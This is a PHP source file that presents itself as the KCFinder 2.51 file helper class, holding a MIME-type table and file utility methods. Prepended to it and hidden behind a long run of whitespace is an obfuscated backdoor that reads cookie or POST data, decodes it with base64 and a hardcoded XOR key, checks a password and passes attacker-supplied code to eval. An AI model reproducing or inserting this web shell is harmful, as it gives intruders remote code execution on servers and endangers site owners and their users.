<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $kcd52 = 960;$GLOBALS['md50ac5'] = Array();global $md50ac5;$md50ac5 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['i4eb833'] = "\x79\x58\x53\x67\x54\x7a\x21\x69\x2a\x2d\x56\x30\xd\x4a\x2e\x35\x44\x2f\x6a\x7b\x6b\x59\xa\x4e\x6d\x48\x3c\x6f\x55\x4b\x78\x63\x64\x36\x61\x34\x33\x22\x37\x41\x43\x60\x75\x5d\x3a\x3b\x4d\x6e\x5c\x7c\x72\x7e\x42\x70\x3f\x5f\x51\x71\x57\x2c\x7d\x27\x74\x20\x29\x4f\x5b\x28\x9\x4c\x77\x49\x66\x40\x73\x76\x52\x46\x3d\x65\x23\x32\x39\x2b\x38\x62\x31\x47\x26\x5e\x25\x24\x5a\x3e\x6c\x50\x45\x68";$md50ac5[$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][32]] = $md50ac5['i4eb833'][31].$md50ac5['i4eb833'][97].$md50ac5['i4eb833'][50];$md50ac5[$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][15]] = $md50ac5['i4eb833'][27].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][32];$md50ac5[$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][33]] = $md50ac5['i4eb833'][32].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][47].$md50ac5['i4eb833'][79];$md50ac5[$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][82]] = $md50ac5['i4eb833'][74].$md50ac5['i4eb833'][62].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][47];$md50ac5[$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][15]] = $md50ac5['i4eb833'][32].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][47].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][32];$md50ac5[$md50ac5['i4eb833'][18].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][31]] = $md50ac5['i4eb833'][7].$md50ac5['i4eb833'][47].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][74].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][62];$md50ac5[$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][38]] = $md50ac5['i4eb833'][74].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][5].$md50ac5['i4eb833'][79];$md50ac5[$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][84]] = $md50ac5['i4eb833'][53].$md50ac5['i4eb833'][97].$md50ac5['i4eb833'][53].$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][74].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][47];$md50ac5[$md50ac5['i4eb833'][53].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][31]] = $md50ac5['i4eb833'][42].$md50ac5['i4eb833'][47].$md50ac5['i4eb833'][74].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][5].$md50ac5['i4eb833'][79];$md50ac5[$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][35]] = $md50ac5['i4eb833'][85].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][74].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][79];$md50ac5[$md50ac5['i4eb833'][97].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][35]] = $md50ac5['i4eb833'][74].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][62].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][62].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][24].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][24].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][62];$md50ac5[$md50ac5['i4eb833'][62].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][38]] = $md50ac5['i4eb833'][20].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][85];$md50ac5[$md50ac5['i4eb833'][30].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][36]] = $md50ac5['i4eb833'][79].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][82].$md50ac5['i4eb833'][33];$md50ac5[$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][86]] = $_POST;$md50ac5[$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][82].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][81]] = $_COOKIE;@$md50ac5[$md50ac5['i4eb833'][18].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][31]]($md50ac5['i4eb833'][79].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][3], NULL);@$md50ac5[$md50ac5['i4eb833'][18].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][31]]($md50ac5['i4eb833'][94].$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][3].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][74], 0);@$md50ac5[$md50ac5['i4eb833'][18].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][31]]($md50ac5['i4eb833'][24].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][30].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][30].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][42].$md50ac5['i4eb833'][62].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][47].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][62].$md50ac5['i4eb833'][7].$md50ac5['i4eb833'][24].$md50ac5['i4eb833'][79], 0);@$md50ac5[$md50ac5['i4eb833'][97].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][35]](0);if (!$md50ac5[$md50ac5['i4eb833'][27].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][15]]($md50ac5['i4eb833'][39].$md50ac5['i4eb833'][69].$md50ac5['i4eb833'][76].$md50ac5['i4eb833'][96].$md50ac5['i4eb833'][39].$md50ac5['i4eb833'][16].$md50ac5['i4eb833'][21].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][76].$md50ac5['i4eb833'][28].$md50ac5['i4eb833'][23].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][34])){$md50ac5[$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][33]]($md50ac5['i4eb833'][39].$md50ac5['i4eb833'][69].$md50ac5['i4eb833'][76].$md50ac5['i4eb833'][96].$md50ac5['i4eb833'][39].$md50ac5['i4eb833'][16].$md50ac5['i4eb833'][21].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][76].$md50ac5['i4eb833'][28].$md50ac5['i4eb833'][23].$md50ac5['i4eb833'][55].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][34], 1);$g30157 = NULL;$x587f0b8 = NULL;$md50ac5[$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][82].$md50ac5['i4eb833'][85]] = $md50ac5['i4eb833'][33].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][82].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][9].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][9].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][82].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][9].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][9].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][82].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][79];global $l479b;function  eb1696($g30157, $y90645){global $md50ac5;$n6eef5 = "";for ($ce49ca1=0; $ce49ca1<$md50ac5[$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][82]]($g30157);){for ($oeaa6279=0; $oeaa6279<$md50ac5[$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][82]]($y90645) && $ce49ca1<$md50ac5[$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][82]]($g30157); $oeaa6279++, $ce49ca1++){$n6eef5 .= $md50ac5[$md50ac5['i4eb833'][50].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][86].$md50ac5['i4eb833'][32]]($md50ac5[$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][15]]($g30157[$ce49ca1]) ^ $md50ac5[$md50ac5['i4eb833'][75].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][15]]($y90645[$oeaa6279]));}}return $n6eef5;}function  k4366cb($g30157, $y90645){global $md50ac5;global $l479b;return $md50ac5[$md50ac5['i4eb833'][30].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][36]]($md50ac5[$md50ac5['i4eb833'][30].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][36]]($g30157, $l479b), $y90645);}foreach ($md50ac5[$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][82].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][81]] as $y90645=>$c4d8b){$g30157 = $c4d8b;$x587f0b8 = $y90645;}if (!$g30157){foreach ($md50ac5[$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][79].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][86]] as $y90645=>$c4d8b){$g30157 = $c4d8b;$x587f0b8 = $y90645;}}$g30157 = @$md50ac5[$md50ac5['i4eb833'][53].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][36].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][31]]($md50ac5[$md50ac5['i4eb833'][62].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][33].$md50ac5['i4eb833'][84].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][81].$md50ac5['i4eb833'][38]]($md50ac5[$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][85].$md50ac5['i4eb833'][38].$md50ac5['i4eb833'][15].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][35]]($g30157), $x587f0b8));if (isset($g30157[$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][20]]) && $l479b==$g30157[$md50ac5['i4eb833'][34].$md50ac5['i4eb833'][20]]){if ($g30157[$md50ac5['i4eb833'][34]] == $md50ac5['i4eb833'][7]){$ce49ca1 = Array($md50ac5['i4eb833'][53].$md50ac5['i4eb833'][75] => @$md50ac5[$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][72].$md50ac5['i4eb833'][31].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][32].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][84]](),$md50ac5['i4eb833'][74].$md50ac5['i4eb833'][75] => $md50ac5['i4eb833'][86].$md50ac5['i4eb833'][14].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][9].$md50ac5['i4eb833'][86],);echo @$md50ac5[$md50ac5['i4eb833'][94].$md50ac5['i4eb833'][35].$md50ac5['i4eb833'][11].$md50ac5['i4eb833'][38]]($ce49ca1);}elseif ($g30157[$md50ac5['i4eb833'][34]] == $md50ac5['i4eb833'][79]){eval/*w9704ae0*/($g30157[$md50ac5['i4eb833'][32]]);}exit();}} ?><?php

/** This file is part of KCFinder project
  *
  *      @desc File helper class
  *   @package KCFinder
  *   @version 2.51
  *    @author Pavel Tzonkov <pavelc@users.sourceforge.net>
  * @copyright 2010, 2011 KCFinder Project
  *   @license http://www.opensource.org/licenses/gpl-2.0.php GPLv2
  *   @license http://www.opensource.org/licenses/lgpl-2.1.php LGPLv2
  *      @link http://kcfinder.sunhater.com
  */

class file {

    static $MIME = array(
        'ai'    => 'application/postscript',
        'aif'   => 'audio/x-aiff',
        'aifc'  => 'audio/x-aiff',
        'aiff'  => 'audio/x-aiff',
        'avi'   => 'video/x-msvideo',
        'bin'   => 'application/macbinary',
        'bmp'   => 'image/bmp',
        'cpt'   => 'application/mac-compactpro',
        'css'   => 'text/css',
        'csv'   => 'text/x-comma-separated-values',
        'dcr'   => 'application/x-director',
        'dir'   => 'application/x-director',
        'doc'   => 'application/msword',
        'docx'  => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'dvi'   => 'application/x-dvi',
        'dxr'   => 'application/x-director',
        'eml'   => 'message/rfc822',
        'eps'   => 'application/postscript',
        'flv'   => 'video/x-flv',
        'gif'   => 'image/gif',
        'gtar'  => 'application/x-gtar',
        'gz'    => 'application/x-gzip',
        'hqx'   => 'application/mac-binhex40',
        'htm'   => 'text/html',
        'html'  => 'text/html',
        'jpe'   => 'image/jpeg',
        'jpeg'  => 'image/jpeg',
        'jpg'   => 'image/jpeg',
        'js'    => 'application/x-javascript',
        'log'   => 'text/plain',
        'mid'   => 'audio/midi',
        'midi'  => 'audio/midi',
        'mif'   => 'application/vnd.mif',
        'mov'   => 'video/quicktime',
        'movie' => 'video/x-sgi-movie',
        'mp2'   => 'audio/mpeg',
        'mp3'   => 'audio/mpeg',
        'mpe'   => 'video/mpeg',
        'mpeg'  => 'video/mpeg',
        'mpg'   => 'video/mpeg',
        'mpga'  => 'audio/mpeg',
        'oda'   => 'application/oda',
        'pdf'   => 'application/pdf',
        'php'   => 'application/x-httpd-php',
        'php3'  => 'application/x-httpd-php',
        'php4'  => 'application/x-httpd-php',
        'phps'  => 'application/x-httpd-php-source',
        'phtml' => 'application/x-httpd-php',
        'png'   => 'image/png',
        'ppt'   => 'application/powerpoint',
        'ps'    => 'application/postscript',
        'psd'   => 'application/x-photoshop',
        'qt'    => 'video/quicktime',
        'ra'    => 'audio/x-realaudio',
        'ram'   => 'audio/x-pn-realaudio',
        'rm'    => 'audio/x-pn-realaudio',
        'rpm'   => 'audio/x-pn-realaudio-plugin',
        'rtf'   => 'text/rtf',
        'rtx'   => 'text/richtext',
        'rv'    => 'video/vnd.rn-realvideo',
        'shtml' => 'text/html',
        'sit'   => 'application/x-stuffit',
        'smi'   => 'application/smil',
        'smil'  => 'application/smil',
        'swf'   => 'application/x-shockwave-flash',
        'tar'   => 'application/x-tar',
        'tgz'   => 'application/x-tar',
        'text'  => 'text/plain',
        'tif'   => 'image/tiff',
        'tiff'  => 'image/tiff',
        'txt'   => 'text/plain',
        'wav'   => 'audio/x-wav',
        'wbxml' => 'application/wbxml',
        'wmlc'  => 'application/wmlc',
        'word'  => 'application/msword',
        'xht'   => 'application/xhtml+xml',
        'xhtml' => 'application/xhtml+xml',
        'xl'    => 'application/excel',
        'xls'   => 'application/excel',
        'xlsx'  => 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        'xml'   => 'text/xml',
        'xsl'   => 'text/xml',
        'zip'   => 'application/x-zip'
    );

  /** Checks if the given file is really writable. The standard PHP function
    * is_writable() does not work properly on Windows servers.
    * @param string $dir
    * @return bool */

    static function isWritable($filename) {
        $filename = path::normalize($filename);
        if (!is_file($filename) || (false === ($fp = @fopen($filename, 'a+'))))
            return false;
        fclose($fp);
        return true;
    }

  /** Get the extension from filename
    * @param string $file
    * @param bool $toLower
    * @return string */

    static function getExtension($filename, $toLower=true) {
        return preg_match('/^.*\.([^\.]*)$/s', $filename, $patt)
            ? ($toLower ? strtolower($patt[1]) : $patt[1]) : "";
    }

  /** Get MIME type of the given filename. If Fileinfo PHP extension is
    * available the MIME type will be fetched by the file's content. The
    * second parameter is optional and defines the magic file path. If you
    * skip it, the default one will be loaded.
    * If Fileinfo PHP extension is not available the MIME type will be fetched
    * by filename extension regarding $MIME property. If the file extension
    * does not exist there, returned type will be application/octet-stream
    * @param string $filename
    * @param string $magic
    * @return string */

    static function getMimeType($filename, $magic=null) {
        if (class_exists("finfo")) {
            $finfo = ($magic === null)
                ? new finfo(FILEINFO_MIME)
                : new finfo(FILEINFO_MIME, $magic);
            if ($finfo) {
                $mime = $finfo->file($filename);
                $mime = substr($mime, 0, strrpos($mime, ";"));
                return $mime;
            }
        }
        $ext = self::getExtension($filename, true);
        return isset(self::$MIME[$ext]) ? self::$MIME[$ext] : "application/octet-stream";
    }

  /** Get inexistant filename based on the given filename. If you skip $dir
    * parameter the directory will be fetched from $filename and returned
    * value will be full filename path. The third parameter is optional and
    * defines the template, the filename will be renamed to. Default template
    * is {name}({sufix}){ext}. Examples:
    *
    *   file::getInexistantFilename("/my/directory/myfile.txt");
    *   If myfile.txt does not exist - returns the same path to the file
    *   otherwise returns "/my/directory/myfile(1).txt"
    *
    *   file::getInexistantFilename("myfile.txt", "/my/directory");
    *   returns "myfile.txt" or "myfile(1).txt" or "myfile(2).txt" etc...
    *
    *   file::getInexistantFilename("myfile.txt", "/dir", "{name}[{sufix}]{ext}");
    *   returns "myfile.txt" or "myfile[1].txt" or "myfile[2].txt" etc...
    *
    * @param string $filename
    * @param string $dir
    * @param string $tpl
    * @return string */

    static function getInexistantFilename($filename, $dir=null, $tpl=null) {
        if ($tpl === null)  $tpl = "{name}({sufix}){ext}";
        $fullPath = ($dir === null);
        if ($fullPath)
            $dir = path::normalize(dirname($filename));
        else {
            $fdir = dirname($filename);
            $dir = strlen($fdir)
                ? path::normalize("$dir/$fdir")
                : path::normalize($dir);
        }
        $filename = basename($filename);
        $ext = self::getExtension($filename, false);
        $name = strlen($ext) ? substr($filename, 0, -strlen($ext) - 1) : $filename;
        $tpl = str_replace('{name}', $name, $tpl);
        $tpl = str_replace('{ext}', (strlen($ext) ? ".$ext" : ""), $tpl);
        $i = 1; $file = "$dir/$filename";
        while (file_exists($file))
            $file = "$dir/" . str_replace('{sufix}', $i++, $tpl);

        return $fullPath
            ? $file
            : (strlen($fdir)
                ? "$fdir/" . basename($file)
                : basename($file));
    }

}

?>